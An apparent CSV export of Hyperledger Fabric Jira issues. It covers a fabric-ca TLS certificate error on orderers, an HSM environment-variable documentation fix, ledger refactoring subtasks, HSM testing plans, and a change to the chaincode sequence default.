{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tlstmp/tlsintermediatecerts ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/msp{color}

{color:#0747a6}fabric-ca-client register --id.name or1-gm-orderer --id.type orderer --id.affiliation ""com.h3c"" --id.attrs '""role=orderer"",ecert=true' --id.secret=123456 --csr.cn=or1-gm-orderer --csr.hosts=['or1-gm-orderer'] -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client enroll -d --enrollment.profile tls -u http://or1-gm-orderer:[123456@0.0.0.0|mailto:123456@0.0.0.0]:7056 --csr.cn=or1-gm-orderer --csr.hosts=['or1-gm-orderer'] -M ./crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tlstmp --home ./fabric-ca-client{color}

{color:#0747a6}mkdir        ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tls/{color}

{color:#0747a6}cp ./server_2/ca-chain.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tls/ca.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tlstmp/signcerts/cert.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tls/server.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tlstmp/keystore/*_sk ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tls/server.key{color}

{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tlstmp/tlscacerts ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/msp{color}

{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/tlstmp/tlsintermediatecerts  ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or1.h3c.com/msp{color}

{color:#0747a6}fabric-ca-client register --id.name or2-gm-orderer --id.type orderer --id.affiliation ""com.h3c"" --id.attrs '""role=orderer"",ecert=true' --id.secret=123456 --csr.cn=or2-gm-orderer --csr.hosts=['or2-gm-orderer'] -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client enroll -d --enrollment.profile tls -u http://or2-gm-orderer:[123456@0.0.0.0|mailto:123456@0.0.0.0]:7056 --csr.cn=or2-gm-orderer --csr.hosts=['or2-gm-orderer'] -M ./crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tlstmp --home ./fabric-ca-client{color}

{color:#0747a6}mkdir ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tls/{color}

{color:#0747a6}cp ./server_2/ca-chain.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tls/ca.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tlstmp/signcerts/cert.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tls/server.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tlstmp/keystore/*_sk ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tls/server.key{color}

{color:#0747a6} {color}

{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tlstmp/tlscacerts ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/msp{color}

{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/tlstmp/tlsintermediatecerts  ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/orderers/or2.h3c.com/msp{color}

{color:#0747a6} {color}

{color:#0747a6} {color}The error info look like this :

 

2020-05-12 11:19:02.169 CST [grpc] switchBalancer -> DEBU 360 ClientConn switching balancer to ""pick_first""

2020-05-12 11:19:02.169 CST [grpc] HandleSubConnStateChange -> DEBU 361 pickfirstBalancer: HandleSubConnStateChange: 0xc000223010, CONNECTING

{color:#FF0000}2020-05-12 11:19:02.173 CST [grpc] createTransport -> DEBU 362 grpc: addrConn.createTransport failed to connect to \{or1-gm-orderer:30000 0  <nil>}. Err :connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority"". Reconnecting...{color}

2020-05-12 11:19:02.173 CST [grpc] HandleSubConnStateChange -> DEBU 363 pickfirstBalancer: HandleSubConnStateChange: 0xc00050f320, TRANSIENT_FAILURE

2020-05-12 11:19:02.173 CST [core.comm] ServerHandshake -> ERRO 364 TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=172.20.1.1:49108

2020-05-12 11:19:02.173 CST [grpc] handleRawConn -> DEBU 365 grpc: Server.Serve failed to complete security handshake from ""172.20.1.1:49108"": remote error: tls: bad certificate

2020-05-12 11:19:02.174 CST [grpc] createTransport -> DEBU 366 grpc: addrConn.createTransport failed to connect to \{or2-gm-orderer:30001 0  <nil>}. Err :connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority"". Reconnecting...

2020-05-12 11:19:02.175 CST [grpc] HandleSubConnStateChange -> DEBU 367 pickfirstBalancer: HandleSubConnStateChange: 0xc000223010, TRANSIENT_FAILURE

2020-05-12 11:19:02.934 CST [core.comm] ServerHandshake -> ERRO 368 TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=172.20.0.0:38260

2020-05-12 11:19:02.939 CST [grpc] handleRawConn -> DEBU 369 grpc: Server.Serve failed to complete security handshake from ""172.20.0.0:38260"": remote error: tls: bad certificate

2020-05-12 11:19:03.169 CST [grpc] HandleSubConnStateChange -> DEBU 36a pickfirstBalancer: HandleSubConnStateChange: 0xc00050f320, CONNECTING

2020-05-12 11:19:03.170 CST [grpc] HandleSubConnStateChange -> DEBU 36b pickfirstBalancer: HandleSubConnStateChange: 0xc000223010, CONNECTING

2020-05-12 11:19:03.172 CST [grpc] createTransport -> DEBU 36c grpc: addrConn.createTransport failed to connect to \{or1-gm-orderer:30000 0  <nil>}. Err :connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority"". Reconnecting...

2020-05-12 11:19:03.172 CST [core.comm] ServerHandshake -> ERRO 36d TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=172.20.1.1:49118

2020-05-12 11:19:03.172 CST [grpc] HandleSubConnStateChange -> DEBU 36e pickfirstBalancer: HandleSubConnStateChange: 0xc00050f320, TRANSIENT_FAILURE

2020-05-12 11:19:03.172 CST [grpc] handleRawConn -> DEBU 36f grpc: Server.Serve failed to complete security handshake from ""172.20.1.1:49118"": remote error: tls: bad certificate

2020-05-12 11:19:03.174 CST [grpc] createTransport -> DEBU 370 grpc: addrConn.createTransport failed to connect to \{or2-gm-orderer:30001 0  <nil>}. Err :connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority"". Reconnecting...

2020-05-12 11:19:03.174 CST [grpc] HandleSubConnStateChange -> DEBU 371 pickfirstBalancer: HandleSubConnStateChange: 0xc000223010, TRANSIENT_FAILURE

2020-05-12 11:19:04.489 CST [grpc] HandleSubConnStateChange -> DEBU 372 pickfirstBalancer: HandleSubConnStateChange: 0xc00050f320, CONNECTING

2020-05-12 11:19:04.492 CST [core.comm] ServerHandshake -> ERRO 373 TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=172.20.1.1:49130

2020-05-12 11:19:04.492 CST [grpc] createTransport -> DEBU 374 grpc: addrConn.createTransport failed to connect to \{or1-gm-orderer:30000 0  <nil>}. Err :connection error: desc = ""transport: authentication handshake failed: x509: certificate signed by unknown authority"". Reconnecting...

2020-05-12 11:19:04.492 CST [grpc] handleRawConn -> DEBU 375 grpc: Server.Serve failed to complete security handshake from ""172.20.1.1:49130"": remote error: tls: bad certificate

2020-05-12 11:19:04.492 CST [grpc] HandleSubConnStateChange -> DEBU 376 pickfirstBalancer: HandleSubConnStateChange: 0xc00050f320, TRANSIENT_FAILURE

2020-05-12 11:19:04.732 CST [grpc] HandleSubConnStateChange -> DEBU 377 pickfirstBalancer: HandleSubConnStateChange: 0x

 

I have changed the orderer's port from 7050 to 30000, and when I use the cryptogen tools to create msp , it can work normally , But when I changed to the fabric-ca , It always get errors. Can anyone tell me how to fix it?

 ",,mastersingh24,ritel126,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bwr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),mastersingh24,ritel126,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/May/20 5:42 PM;mastersingh24;What are you using to generate the genesis block for your orderer system channel?  Looks like you might not have the correct TLS identities configured for your orderer nodes;;;","26/Dec/20 7:20 PM;mastersingh24;I'm closing this as stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error Doc: Using HSM,FAB-17877,45048,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,InRu,InRu,12/May/20 8:48 PM,13/May/20 8:16 PM,28/Oct/23 3:10 AM,13/May/20 8:16 PM,,,,,,,,,,v1.4.7,v2.0.0,v2.1.0,v2.2.0,fabric-docs,,,,,,,,,0,,,,,,"I try to use a SoftHSM for my Orderer and tried a long time to overwrite the values in the orderer.yaml via  the environment variables of my own yaml file I use when starting the image via docker-compose.

I orientate at the Hyperledger Docs for V1.4 and V2.0. But unfortunately in both versions there is an error in the description of the variables.

 

Current state:

ORDERER_GENERAL_PKCS11_LIBRARY=/etc/hyperledger/fabric/libsofthsm2.so

ORDERER_GENERAL_PKCS11_PIN=71811222

ORDERER_GENERAL_PKCS11_LABEL=fabric

 

Should be:

ORDERER_GENERAL_{color:#FF0000}BCCSP_{color}PKCS11_LIBRARY=/etc/hyperledger/fabric/libsofthsm2.so

ORDERER_GENERAL_{color:#FF0000}BCCSP_{color}PKCS11_PIN=71811222

ORDERER_GENERAL_{color:#FF0000}BCCSP_{color}PKCS11_LABEL=fabric

 ",,btl5037,InRu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bwz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,InRu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/May/20 6:07 AM;btl5037;[https://github.com/hyperledger/fabric/pull/1244/files];;;","13/May/20 6:07 AM;btl5037;Thank you for bringing to our attention;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add test for commit hash to ensure backward compatibility,FAB-17878,45049,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,12/May/20 9:06 PM,13/May/20 1:06 AM,28/Oct/23 3:10 AM,13/May/20 1:06 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bx7:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Downlevel fabric-tools:latest in Docker Hub breaks byfn.sh,FAB-17879,45051,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid: Works as Expected,,ccorley,ccorley,12/May/20 11:16 PM,13/May/20 6:11 AM,28/Oct/23 3:10 AM,13/May/20 6:11 AM,,,,,,,,,,,,,,fabric-tools,,,,,,,,,0,,,,,,"first-network is deprecated, but, regardless, fabric-tools:latest in Docker Hub appears to be downlevel.

When running byfn.sh with no version specified (so latest tag is used) we see:

     LOCAL_VERSION=2.1.0

     DOCKER_IMAGE_VERSION=1.4.6

     =================== WARNING ===================

     Local fabric binaries and docker images are out of  sync. This may cause problems.       

     ===============================================

     ERROR! Fabric Docker image version of 1.4.6 does not match this newer version of BYFN and is unsupported. Either move to a later version of Fabric or checkout an earlier version of fabric-samples.

Note that if the all-in-one command to clone fabric-samples and pull the docker images is used, this problem down not occur, likely because version fabric-tools:2.1 gets tagged as latest.",,btl5037,ccorley,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bxn:",,,,Unset,Unset,,"docker pull hyperledger/fabric-tools:latest
./byfn.sh up",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,ccorley,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/May/20 6:02 AM;btl5037;This behavior is correct. If you are not using the all-in-one `bootstrap.sh` script to bootstrap everything, it is up to you to download the correct dependencies. It is expected you would pull the correct image version and retag it as latest yourself.

It is also up to you to download the matching config files and binaries. And you also would need to checkout the correct tag of samples to match all of these deps.

Samples does not easily exist independent of the bootstrapping script. We are aware of the deficiencies in this process and we have plans to address it, but until we do, it's highly recommended, unless you understand exactly what your deps are and how to retrieve them, that you use the bootstrapping script.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm DB interface from privacyenabledstate pkg,FAB-17880,45054,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,13/May/20 12:46 AM,15/May/20 1:41 AM,28/Oct/23 3:10 AM,15/May/20 1:41 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01byb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When running ./network.sh deployCC in fabric-samples/test-network, Chaincode installation on peer0.org1 has failed",FAB-17881,45056,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,btl5037,btl5037,btl5037,13/May/20 11:59 AM,28/Sep/20 9:38 AM,28/Oct/23 3:10 AM,28/Sep/20 9:38 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Due to the limitation of Fabric not being able to use the Fabric-CA in its integration tests, the difficulty with writing an HSM integration test is high, requiring the developer to interface with the HSM directly.

To allow us to test HSM functionality, and test changes to the Fabric codebase, we should write a functional test that can consume Fabric images and stand up a network with the HSM enabled.

This test will use 1 Peer, 1 orderer, and 1 CA.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2i",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stand Up Fabric-CA With SoftHSM,FAB-17882,45057,45056,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,,btl5037,btl5037,13/May/20 12:00 PM,28/Sep/20 9:38 AM,28/Oct/23 3:10 AM,28/Sep/20 9:38 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Start a Fabric-CA server Docker container that mounts the hosts SOFTHSM library and initializes successfully.,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01byz:",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unrecoverable State When Using HSM,FAB-17883,45059,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,btl5037,btl5037,btl5037,13/May/20 9:55 PM,22/May/20 3:24 PM,28/Oct/23 3:10 AM,22/May/20 3:23 PM,v1.4.6,v2.1.0,,,,,,,,v1.4.8,v2.2.0,,,fabric-crypto,fabric-peer,fabric-quality,,,,,,,0,operator,,,,,"When using an HSM enabled component it is possible under light load for the component to enter an unrecoverable state.

A change was initially added to validate the HSM session prior to making calls to the HSM. While initially suspected to fix the issue, the problem reoccurred. We need to investigate the use of BCCSP and isolate the cause of the unrecoverable state.

This Jira specifically focuses on the crashing and unrecoverable state of the component. A separate Jira should investigate the performance capabilities of an HSM enable network.

Acceptance criteria: Components no longer enters an unrecoverable state if an operation is performed on an invalid session.",,btl5037,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz3",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/May/20 3:23 PM;btl5037;This is only recreatable when using the pkcs11-proxy, there are no load issues, or peer crashes which result in the unrecoverable state when using an HSM enabled network with no proxy.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
refactor pvtstatepurgemgmt pkg,FAB-17884,45060,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,14/May/20 12:38 AM,24/Nov/20 6:48 AM,28/Oct/23 3:10 AM,24/Nov/20 6:48 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bzn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Nov/20 6:48 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1252;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable LevelDB based statedb impl for scanning for snapshot files,FAB-17885,45061,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,14/May/20 7:29 AM,15/May/20 6:09 AM,28/Oct/23 3:10 AM,15/May/20 6:09 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"- Introduce a function in the statedb for getting access to an iterator that can be used for scanning the entire state, including private data hashes for a particular channel. 
- Provide the implementation of the above mentioned function for the leveldb based statedb.",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bzv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix default value of `sequence` parameter to empty,FAB-17886,45062,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,14/May/20 8:42 AM,14/May/20 2:18 PM,28/Oct/23 3:10 AM,14/May/20 2:17 PM,v2.0.1,v2.1.0,,,,,,,,v2.2.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, default value of *sequence* parameter for *peer chaincode lifecycle*
 commands is set to *1*.

However, the default value should be modified to *0* that means empty for
 the following several reasons.
 - According to *Validate()* in *approveformyorg.go*, this function is
 implemented assuming that *sequence* is *0*. This is inconsistent with
 the default value *1*.

 - The current default value *1* enables Fabric users ***approveformyorg* without
 specifying the sequence number. Not forcing the specification of a sequence
 number may cause operation mistakes (e.g, updating the package-id for
 sequence 1 by mistake) when running *approveformyorg* in the second and
 subsequent times.

 - The default value is preferably *0* to reuse the same parameter *sequence*
 in CLI commands to query the details of approved chaincode definitions.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c03:",We'll add a v2.2 release note mentioning the default change for sequence from '1' to '0'.,Yes,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Docs: Add descriptions for Linux in prerequisites for development environment,FAB-17887,45063,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,ynamiki,ynamiki,ynamiki,14/May/20 8:58 AM,18/May/20 10:29 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"In the following page, there is no mentions for Linux in libtool and jq, while SoftHSM has the `apt-get` sample.
https://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html#prerequisites",,denyeart,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c0b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/May/20 10:29 PM;denyeart;[~pandrejko] and [~sykesm] were working on prereq doc so they could comment. I do know that libtool has recently been intentionally removed as not needed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
